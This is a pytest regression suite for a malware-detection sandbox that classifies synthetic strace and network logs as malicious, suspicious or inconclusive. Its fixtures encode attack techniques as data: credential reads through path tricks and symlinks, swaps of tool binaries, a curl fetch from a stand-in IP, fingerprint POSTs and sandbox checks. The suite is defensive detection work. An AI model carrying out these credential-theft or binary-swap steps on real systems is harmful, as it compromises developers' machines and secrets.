"""Regression tests for the rule-based verdict (burner/node/detect.py) on synthetic gVisor strace logs.

Each case is a way to read a planted fake secret without naming its absolute path, plus the
INCONCLUSIVE rule (nothing ran, so "nothing observed" would be a lie).

  python -m pytest tests/test_detect.py
"""
import importlib.util
import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
_spec = importlib.util.spec_from_file_location("detect", ROOT / "burner" / "node" / "detect.py")
detect = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(detect)

T0 = 1793780800.0
PROJ = "/home/dev/projects/x"
TOKENS = [{"kind": "SSH private key", "path": ".ssh/id_ed25519", "value": "BURNERFAKESSHKEY0123456789abcdef", "severity": "high"},
          {"kind": "AWS access key", "path": ".aws/credentials", "value": "AKIABURNERFAKE000001", "severity": "high"}]
EXFIL = {"type": "tcp", "dst_ip": "203.0.113.9", "dst_port": 443, "host": None, "sni": None, "proto": "tls",
         "method": None, "path": None, "http_host": None, "id": 7, "t": T0 + 3, "body_len": 512}   # encrypted: no token visible


def line(call, args, ret="= 3 (0x3)", comm="node", pid=42, sec=1):
    return (f"I1104 08:26:{40 + sec:02d}.011268       1 strace.go:609] [  {pid}:  {pid}] {comm} X "
            f"{call}({args}) {ret} (10µs)\n")


def run(sys_lines, steps=None, net=(EXFIL,)):
    steps = [{"name": "npm run start", "cmd": "npm start", "rc": 137, "why": "", "t0": T0, "t1": T0 + 45}] \
        if steps is None else steps
    with tempfile.TemporaryDirectory() as d:
        Path(d, "tokens.json").write_text(json.dumps(TOKENS))
        Path(d, "steps.json").write_text(json.dumps(steps))
        Path(d, "net.jsonl").write_text("".join(json.dumps(e) + "\n" for e in net))
        Path(d, "syscalls.log").write_text("".join(sys_lines))
        detect.main(d)
        return json.loads(Path(d, "report.json").read_text())


def reads(rep):
    return {f["evidence"]["what"] for f in rep["findings"] if f["rule"] == "SECRET_READ"}


def test_relative_read_after_chdir_home():
    rep = run([line("openat", "AT_FDCWD /home/dev, 0x7f00 .ssh/id_ed25519, O_RDONLY|O_CLOEXEC, 0o0")])
    assert "SSH private key" in reads(rep) and rep["verdict"] == "MALICIOUS"


def test_dotdot_traversal_from_project():
    rep = run([line("openat", f"AT_FDCWD {PROJ}, 0x7f00 ../../.aws/credentials, O_RDONLY, 0o0")])
    assert "AWS credentials" in reads(rep) and rep["verdict"] == "MALICIOUS"


def test_numeric_dirfd():
    rep = run([line("openat", "0x15 /home/dev/.ssh, 0x7f00 id_ed25519, O_RDONLY, 0o0")])
    assert "SSH private key" in reads(rep)


def test_proc_self_root_and_cwd():
    rep = run([line("openat", f"AT_FDCWD {PROJ}, 0x7f00 /proc/self/root/home/dev/.ssh/id_ed25519, O_RDONLY, 0o0"),
               line("openat", "AT_FDCWD /home/dev, 0x7f00 /proc/self/cwd/.aws/credentials, O_RDONLY, 0o0", sec=2)])
    assert {"SSH private key", "AWS credentials"} <= reads(rep)


def test_open_without_dirfd_uses_last_known_cwd():
    rep = run([line("openat", f"AT_FDCWD /home/dev, 0x7f00 /etc/hosts, O_RDONLY, 0o0"),
               line("open", "0x7f00 .aws/credentials, O_RDONLY, 0o0", sec=2)])
    assert "AWS credentials" in reads(rep)


def test_symlink_to_secret_folder():
    rep = run([line("symlinkat", f"0x7f00 /home/dev/.ssh, AT_FDCWD {PROJ}, 0x7f10 k", ret="= 0 (0x0)"),
               line("openat", f"AT_FDCWD {PROJ}, 0x7f00 k/id_ed25519, O_RDONLY, 0o0", sec=2)])
    assert "SSH private key" in reads(rep) or "SSH folder" in reads(rep)
    assert rep["verdict"] == "MALICIOUS"


def test_relative_symlink_target_is_relative_to_the_link():
    rep = run([line("symlink", f"0x7f00 ../../.aws, 0x7f10 {PROJ}/a", ret="= 0 (0x0)")])
    assert "AWS credentials" in reads(rep)


def test_rename_secret_away():
    rep = run([line("renameat", "AT_FDCWD /home/dev, 0x7f00 .ssh/id_ed25519, AT_FDCWD /home/dev, 0x7f10 /tmp/x",
                    ret="= 0 (0x0)")])
    assert "SSH private key" in reads(rep)


def test_read_write_open_counts_as_read():
    rep = run([line("openat", "AT_FDCWD /home/dev, 0x7f00 /home/dev/.ssh/id_ed25519, O_RDWR, 0o0")])
    assert "SSH private key" in reads(rep)


def test_failed_open_is_not_a_read():
    rep = run([line("openat", "AT_FDCWD /home/dev, 0x7f00 .ssh/id_ed25519, O_RDONLY, 0o0", ret="= 0 (0x0) errno=2 (no such file)")])
    assert not reads(rep)


def test_project_folders_named_like_home_folders_are_not_secrets():
    rep = run([line("openat", f"AT_FDCWD {PROJ}, 0x7f00 work/notes.txt, O_RDONLY, 0o0"),
               line("openat", f"AT_FDCWD {PROJ}, 0x7f00 Documents/spec.md, O_RDONLY, 0o0", sec=2)], net=())
    assert not reads(rep) and rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED"


def test_pm2_state_files_are_normal_but_its_resurrect_dump_is_not():
    w = lambda p, sec: line("openat", f"AT_FDCWD {PROJ}, 0x7f00 /home/dev/.pm2/{p}, O_WRONLY|O_CREAT|O_APPEND, 0o644", sec=sec)
    rep = run([w("logs/app-out-0.log", 1), w("pm2.pid", 2), w("module_conf.json", 3), w("touch", 4)], net=())
    assert rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED", rep["findings"]
    rep = run([w("dump.pm2", 1)], net=())
    assert any("dump.pm2" in f["title"] for f in rep["findings"])


def test_babel_and_v8flags_caches_are_normal():
    """Live false alarm, 6 Nov: developit/express-es6-rest-api (babel-node) wrote these two caches."""
    rep = run([wr("/home/dev/.babel.json", 1),
               wr("/home/dev/.v8flags.12.4.254.21-node.57.e77989ed21758e78331b20e477fc5582.json", 2)], net=())
    assert not rules(rep, "DROPPED_FILE"), rep["findings"]
    assert rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED"


def test_inconclusive_when_nothing_ran():
    rep = run([], steps=[], net=())
    assert rep["verdict"] == "INCONCLUSIVE" and "safe" in rep["headline"]
    rep = run([], steps=[{"name": "python main.py", "cmd": "python3 main.py", "rc": 127, "why": "", "t0": T0, "t1": T0 + 1}],
              net=())
    assert rep["verdict"] == "INCONCLUSIVE"


def test_bad_behaviour_still_wins_when_steps_failed():
    rep = run([line("openat", "AT_FDCWD /home/dev, 0x7f00 .ssh/id_ed25519, O_RDONLY, 0o0")],
              steps=[{"name": "x", "cmd": "x", "rc": 127, "why": "", "t0": T0, "t1": T0 + 45}])
    assert rep["verdict"] == "MALICIOUS"


def rules(rep, rule):
    return [f for f in rep["findings"] if f["rule"] == rule]


C2 = {"type": "tcp", "dst_ip": "203.0.113.77", "dst_port": 8080, "host": None, "sni": None, "proto": "http",
      "method": "POST", "path": "/api/register", "http_host": "203.0.113.77:8080", "id": 9, "t": T0 + 4}


def wr(path, sec=1, comm="node", ret="= 3 (0x3)"):
    return line("openat", f"AT_FDCWD {PROJ}, 0x7f00 {path}, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0o666", ret=ret,
                comm=comm, sec=sec)


def test_binary_swap_pyenv_shim_write_and_chmod():
    """Binance heist (Nov 2026): the take-home overwrote the pyenv executable, then phoned home."""
    rep = run([wr("/home/dev/.pyenv/shims/pyenv"),
               line("chmod", "0x7f00 /home/dev/.pyenv/shims/pyenv, 0o755", ret="= 0 (0x0)", sec=2)], net=(C2,))
    (f,) = rules(rep, "BINARY_SWAP")
    assert f["severity"] == "high" and f["evidence"]["file"] == "~/.pyenv/shims/pyenv"
    assert f["evidence"]["actions"] == ["write", "chmod"]
    assert not rules(rep, "DROPPED_FILE")            # reported once, as the swap
    assert rep["verdict"] == "MALICIOUS" and "pyenv" in rep["headline"]


def test_binary_swap_alone_is_suspicious():
    rep = run([wr("/home/dev/.local/bin/helper")], net=())
    assert rules(rep, "BINARY_SWAP") and rep["verdict"] == "SUSPICIOUS"


def test_binary_swap_via_rename_symlink_and_fchmodat():
    rep = run([line("renameat2", f"AT_FDCWD {PROJ}, 0x7f00 /tmp/x, AT_FDCWD {PROJ}, 0x7f10 /home/dev/.cargo/bin/cargo, 0x0",
                    ret="= 0 (0x0)"),
               line("symlinkat", f"0x7f00 /tmp/evil, AT_FDCWD /home/dev, 0x7f10 bin/git", ret="= 0 (0x0)", sec=2),
               line("fchmodat", "AT_FDCWD /home/dev, 0x7f00 .nvm/versions/node/v22.11.0/bin/npm, 0o755", ret="= 0 (0x0)",
                    sec=3)], net=())
    files = {f["evidence"]["file"] for f in rules(rep, "BINARY_SWAP")}
    assert files == {"~/.cargo/bin/cargo", "~/bin/git", "~/.nvm/versions/node/v22.11.0/bin/npm"}


def test_binary_swap_dev_tool_name_in_any_path_like_dir():
    rep = run([wr("/home/dev/go/bin/git"), wr("/usr/local/sbin/sudo", sec=2, ret="= 0 (0x0) errno=13 (permission denied)")],
              net=())
    found = {f["evidence"]["file"]: f["title"] for f in rules(rep, "BINARY_SWAP")}
    assert set(found) == {"~/go/bin/git", "/usr/local/sbin/sudo"}
    assert found["/usr/local/sbin/sudo"].startswith("Tried to replace")


def test_binary_swap_ignores_project_bin_node_modules_and_caches():
    rep = run([wr(f"{PROJ}/bin/cli.js"), wr(f"{PROJ}/node_modules/.bin/eslint", sec=2),
               line("symlinkat", f"0x7f00 ../eslint/bin/eslint.js, AT_FDCWD {PROJ}, 0x7f10 node_modules/.bin/node",
                    ret="= 0 (0x0)", sec=3),
               wr("/home/dev/.npm/_npx/1a2b/node_modules/.bin/node", sec=4),
               wr(f"{PROJ}/.venv/bin/python", sec=5), wr("/tmp/venv/bin/python3", sec=6),
               wr("/home/dev/.local/share/app/state.json", sec=7),
               line("openat", "AT_FDCWD /home/dev, 0x7f00 /home/dev/.pyenv/shims/pyenv, O_RDONLY, 0o0", sec=8)], net=())
    assert not rules(rep, "BINARY_SWAP"), rules(rep, "BINARY_SWAP")
    assert rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED", rep["findings"]


HOSTNAME = "dev-thinkpad-t14s-q7k2"


def run_fp(sys_lines, net, bodies):
    """run() with identity.json and captured request bodies ({event id: bytes})."""
    steps = [{"name": "npm run start", "cmd": "npm start", "rc": 137, "why": "", "t0": T0, "t1": T0 + 45}]
    with tempfile.TemporaryDirectory() as d:
        Path(d, "tokens.json").write_text(json.dumps(TOKENS))
        Path(d, "identity.json").write_text(json.dumps({"hostname": HOSTNAME, "username": "dev"}))
        Path(d, "steps.json").write_text(json.dumps(steps))
        Path(d, "bodies").mkdir()
        for i, b in bodies.items():
            Path(d, "bodies", f"{i}.bin").write_bytes(b)
        net = [{**e, "body_file": f"{e['id']}.bin", "body_len": len(bodies[e["id"]])} if e["id"] in bodies else e
               for e in net]
        Path(d, "net.jsonl").write_text("".join(json.dumps(e) + "\n" for e in net))
        Path(d, "syscalls.log").write_text("".join(sys_lines))
        detect.main(d)
        return json.loads(Path(d, "report.json").read_text())


LOADER = {"type": "tcp", "dst_ip": "198.18.0.3", "dst_port": 443, "host": "cdn-fonts.example", "sni": "cdn-fonts.example",
          "tls": True, "proto": "https", "method": "POST", "path": "/api/v2/init", "http_host": "cdn-fonts.example",
          "id": 11, "t": T0 + 5}
GH = {"type": "tcp", "dst_ip": "198.18.0.2", "dst_port": 443, "host": "api.github.com", "sni": "api.github.com",
      "tls": True, "proto": "https", "method": "GET", "path": "/users/octocat", "http_host": "api.github.com",
      "id": 12, "t": T0 + 6}


def test_fingerprint_hexeval_style_post_is_suspicious():
    """HexEval (Socket, Jul 2025): POST hostname/platform/username, eval the reply."""
    body = json.dumps({"h": HOSTNAME, "p": "linux", "u": "dev"}).encode()
    rep = run_fp([], net=(LOADER,), bodies={11: body})
    (f,) = rules(rep, "FINGERPRINT")
    assert f["severity"] == "high" and f["evidence"]["sent_to"] == "cdn-fonts.example"
    assert f["evidence"]["fields"] == ["hostname", "username", "OS"]
    assert rep["verdict"] == "SUSPICIOUS" and "cdn-fonts.example" in rep["headline"]


def test_fingerprint_found_when_encoded():
    import base64
    body = b"d=" + base64.b64encode(json.dumps({"host": HOSTNAME, "plat": "linux"}).encode())
    rep = run_fp([], net=(LOADER,), bodies={11: body})
    assert rules(rep, "FINGERPRINT") and rules(rep, "FINGERPRINT")[0]["evidence"]["encoded"]


def test_fingerprint_plus_downloader_is_malicious():
    rep = run_fp([line("execve", '0x7f00 /usr/bin/curl, ["curl", "-s", "http://198.51.100.40/s"], ["PATH=/usr/bin"]',
                       ret="= 0 (0x0)", comm="node")],
                 net=(LOADER,), bodies={11: f"host={HOSTNAME}".encode()})
    assert rep["verdict"] == "MALICIOUS" and "loader" in rep["headline"]


def test_fingerprint_plus_binary_swap_is_malicious():
    rep = run_fp([wr("/home/dev/.pyenv/shims/pyenv")], net=(LOADER,), bodies={11: f"host={HOSTNAME}".encode()})
    assert rules(rep, "FINGERPRINT") and rules(rep, "BINARY_SWAP") and rep["verdict"] == "MALICIOUS"


def test_no_fingerprint_for_github_api_or_generic_words():
    """b05 calls api.github.com; 'dev' / 'linux' on the wire without the scan's hostname mean nothing."""
    rep = run_fp([], net=(GH, LOADER), bodies={12: b"", 11: b'{"user":"dev","platform":"linux","host":"dev-laptop"}'})
    assert not rules(rep, "FINGERPRINT")
    assert rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED", rep["findings"]


def test_no_fingerprint_for_error_reporting_sdk():
    sentry = {**LOADER, "host": "o1.ingest.sentry.io", "sni": "o1.ingest.sentry.io", "http_host": "o1.ingest.sentry.io",
              "path": "/api/1/envelope/"}
    rep = run_fp([], net=(sentry,), bodies={11: json.dumps({"server_name": HOSTNAME}).encode()})
    assert not rules(rep, "FINGERPRINT")


# --- coverage: did the app actually start? (v5)

INSTALL = {"name": "npm install", "cmd": "npm rebuild --foreground-scripts", "rc": 0, "why": "", "t0": T0, "t1": T0 + 3}


def st(name, rc, secs, out="", timeout=45, start=10):
    return {"name": name, "cmd": name, "rc": rc, "why": "w", "timeout": timeout, "t0": T0 + start,
            "t1": T0 + start + secs, "stdout": out, "stderr": ""}


def test_app_that_crashed_at_once_is_inconclusive_with_the_error():
    rep = run([], net=(), steps=[INSTALL, st("npm run dev", 127, 0.4, "> vite\n\nsh: 1: vite: not found\n"),
                                 st("npm run start", 1, 0.9, "\x1b[31mError: Could not find a production build\x1b[0m\n"
                                                             "    at foo (x.js:1:1)\n")])
    assert rep["verdict"] == "INCONCLUSIVE" and rep["headline"] == detect.NEVER_STARTED
    cov = rep["coverage"]
    assert cov["started"] is False and "vite: not found" in cov["reason"]
    assert [s["outcome"] for s in cov["steps"]] == ["finished", "not found", "crashed"]


def test_server_killed_at_timeout_or_long_run_or_exit_0_counts_as_started():
    for s in (st("npm run start", 137, 45.1), st("npm test", 1, 7.8), st("python3 main.py", 0, 0.2)):
        rep = run([], net=(), steps=[INSTALL, s])
        assert rep["coverage"]["started"] and rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED", s
    assert run([], net=(), steps=[INSTALL, st("npm run start", 137, 45.1)])["coverage"]["steps"][1]["outcome"] \
        == "kept running"


def test_install_alone_does_not_count_as_started():
    rep = run([], net=(), steps=[INSTALL])
    assert rep["verdict"] == "INCONCLUSIVE" and not rep["coverage"]["started"]


def test_defanged_sample_that_steals_then_exits_1_stays_malicious():
    rep = run([line("openat", "AT_FDCWD /home/dev, 0x7f00 .ssh/id_ed25519, O_RDONLY, 0o0")],
              steps=[INSTALL, st("npm run start", 1, 0.3, "Error: boom")])
    assert rep["verdict"] == "MALICIOUS" and rep["coverage"]["started"] is False


def test_suspicious_is_not_downgraded_when_app_never_started():
    rep = run([wr("/home/dev/.local/bin/git")], net=(), steps=[INSTALL, st("npm run start", 1, 0.3)])
    assert rep["verdict"] == "SUSPICIOUS"


def test_sandbox_check_then_nothing_is_evasive():
    rep = run([line("openat", "AT_FDCWD /home/dev, 0x7f00 /sys/class/dmi/id/product_name, O_RDONLY, 0o0")], net=(),
              steps=[INSTALL, st("npm run start", 137, 45.1)])
    assert rep["verdict"] == "INCONCLUSIVE" and rep["headline"] == detect.EVASIVE
    assert "sandbox" in rep["coverage"]["reason"]


def test_report_steps_carry_masked_tail_source_why_secs():
    secret = TOKENS[1]["value"]
    s = st("npm run start", 137, 45.1, "\n".join(f"line {i}" for i in range(30)) + f"\nkey={secret}\n")
    s["source"] = "recruiter"
    rep = run([], net=(), steps=[s])
    out = rep["steps"][0]
    assert out["source"] == "recruiter" and out["why"] == "w" and out["secs"] == 45.1
    assert secret not in out["tail"] and "<bait:AWS access key>" in out["tail"]
    assert len(out["tail"].splitlines()) <= 20 and len(out["tail"]) <= 2000


def test_env_bait_sent_to_its_service_is_only_medium():
    env_tok = {"kind": "STRIPE_SECRET_KEY (project .env)", "path": "projects/x/.env",
               "value": "sk_test_BURNERFAKEENV0123456789", "severity": "medium", "source": "env",
               "env_key": "STRIPE_SECRET_KEY"}
    stripe = {**EXFIL, "host": "api.stripe.com", "sni": "api.stripe.com", "proto": "https", "method": "POST",
              "path": "/v1/charges?key=" + env_tok["value"]}
    with tempfile.TemporaryDirectory() as d:
        Path(d, "tokens.json").write_text(json.dumps(TOKENS + [env_tok]))
        Path(d, "steps.json").write_text(json.dumps([st("npm run start", 137, 45.1)]))
        Path(d, "net.jsonl").write_text(json.dumps(stripe) + "\n")
        Path(d, "env_setup.json").write_text(json.dumps({"from": ".env.example", "keys": ["STRIPE_SECRET_KEY"],
                                                         "filled": 1}))
        Path(d, "fetch.json").write_text(json.dumps([{"cmd": "fetch hardening", "removed": [".npmrc"]},
                                                     {"cmd": "npm install --ignore-scripts", "rc": 0, "tail": ""}]))
        detect.main(d)
        rep = json.loads(Path(d, "report.json").read_text())
    assert [f["severity"] for f in rules(rep, "EXFIL")] == ["medium"]
    assert rep["verdict"] == "NO MALICIOUS BEHAVIOUR OBSERVED"
    assert rep["env_setup"]["from"] == ".env.example"
    assert rep["fetch"] == {"removed": [".npmrc"], "installs": [{"cmd": "npm install --ignore-scripts", "rc": 0}]}


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            fn()
            print("ok", name)
    sys.exit(0)
